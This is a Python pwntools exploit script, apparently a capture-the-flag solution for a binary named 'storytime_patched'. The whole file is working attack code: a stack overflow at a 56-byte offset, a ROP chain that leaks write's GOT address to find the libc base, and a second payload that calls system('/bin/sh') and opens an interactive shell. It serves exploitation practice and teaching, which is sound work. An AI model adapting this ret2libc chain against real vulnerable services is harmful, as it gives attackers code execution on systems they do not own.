#!/usr/bin/env python3

import pwn
import struct

exe = pwn.ELF("./storytime_patched")
libc = pwn.ELF("./libc.so.6", checksec=False)
ld = pwn.ELF("./ld-2.23.so", checksec=False)

pwn.context.binary = exe

rop = pwn.ROP(exe.path, checksec=False) 
io = pwn.process(exe.path)

def b(x):
    return x.to_bytes(8, "little")

offset = 56

pop_rdi = 0x0000000000400703
pop_rsi_r15 = 0x0000000000400701
write_got = 0x0000000000601018
main = 0x000000000040062E
ret = 0x000000000040048E

# Leak libc address
payload = b""
payload = b"A" * offset
payload += b(pop_rsi_r15)
payload += b(write_got)
payload += b(0x4141414141414141)
payload += b(0x0000000000400601)
payload += b(0x4141414141414141)
payload += b(0x000000000040060e)

io.sendline(payload)
io.recvuntil("story: \n")

leak = io.recv(6)
leak = struct.unpack("Q", leak + b"\x00" * (8 - len(leak)))[0]
base = leak - libc.symbols["write"]
print("leak:", hex(leak))
print("base:", hex(base))
libc.address = base

# Get a shell
payload = b""
payload += b"A" * offset
payload += b(pop_rdi)
payload += b(next(libc.search(b"/bin/sh")))
payload += b(ret)
payload += b(libc.symbols["system"])

io.sendline(payload)
io.interactive()
